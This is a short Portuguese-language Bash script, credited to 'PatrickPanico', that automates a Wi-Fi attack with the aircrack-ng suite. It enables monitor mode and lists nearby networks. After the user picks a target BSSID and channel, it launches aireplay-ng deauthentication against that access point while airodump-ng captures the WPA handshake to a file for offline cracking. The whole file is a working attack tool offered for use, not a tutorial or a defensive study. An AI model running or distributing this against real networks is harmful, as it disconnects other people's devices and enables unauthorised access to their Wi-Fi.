#!/bin/bash

RED='\033[01;31m'
WHITE='\033[01;37m'
echo -e "${RED}
 █     █░ ██▓  █████▒█    ██   ██████
▓█░ █ ░█░▓██▒▓██   ▒ ██  ▓██▒▒██    ▒
▒█░ █ ░█ ▒██▒▒████ ░▓██  ▒██░░ ▓██▄
░█░ █ ░█ ░██░░▓█▒  ░▓▓█  ░██░  ▒   ██▒
░░██▒██▓ ░██░░▒█░   ▒▒█████▓ ▒██████▒▒
░ ▓░▒ ▒  ░▓   ▒ ░   ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
  ▒ ░ ░   ▒ ░ ░     ░░▒░ ░ ░ ░ ░▒  ░ ░
  ░   ░   ▒ ░ ░ ░    ░░░ ░ ░ ░  ░  ░
    ░     ░            ░           ░
${RED}""${WHITE} ${WHITE}"


if [ "$EUID" -ne 0 ] #Verificando ROOT
then printf "${WHITE}Execute o sofware como ROOT!\n ${WHITE}"
    exit
fi

if ! hash xterm 2>/dev/null; then
    printf "${WHITE}Por Favor, Instale o Xterm${WHITE}"; exit 3
fi

if ! hash aircrack-ng 2>/dev/null; then
    printf "${WHITE}Por Favor, Instale o aircrack-ng${WHITE}"; exit 3
fi


if ["$1" == ""]
then
    printf "${WHITE}Desenvolvido por PatrickPanico Modo de uso: $0 Interface de rede\n${WHITE}";
    sleep 2
    exit
fi

airmon-ng check kill "$1"
clear
airmon-ng start "$1"
clear
printf "${WHITE}Quando escolher a rede pressione ctrl+c\n${WHITE}"
sleep 4
airodump-ng "$1"mon
read -p "Digite o BSSID: " bssid
read -p "Digite o CANAL: " canal
printf "${WHITE}Quando Capturar o handshake pressione ctrl+c\n${WHITE}"
sleep 4
xterm -geometry "100x60-0+0" -bg black -fg white -e "aireplay-ng -0 10 -a $bssid $1mon" > /dev/null 2>&1 &
airodump-ng --bssid "$bssid" -c "$canal" -w captura "$1"mon
